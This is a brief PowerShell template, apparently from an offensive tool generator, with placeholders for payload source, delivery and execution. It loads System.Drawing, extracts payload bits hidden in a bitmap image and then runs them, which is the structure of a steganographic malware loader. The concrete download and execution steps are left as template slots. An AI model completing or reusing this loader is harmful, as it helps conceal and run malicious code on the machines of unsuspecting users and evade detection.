[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

[string] $payload_source = "{{ PAYLOAD_SOURCE }}"
[Int32] $length = {{ MAX_BITS }}

{{ ALGORITHM_CODE }}

$BitMap = {{ PAYLOAD_DELIVERY_CODE }}

$payload_data = get_payload $BitMap $length

{{ PAYLOAD_EXEC_CODE }}

Start-Sleep -s 3
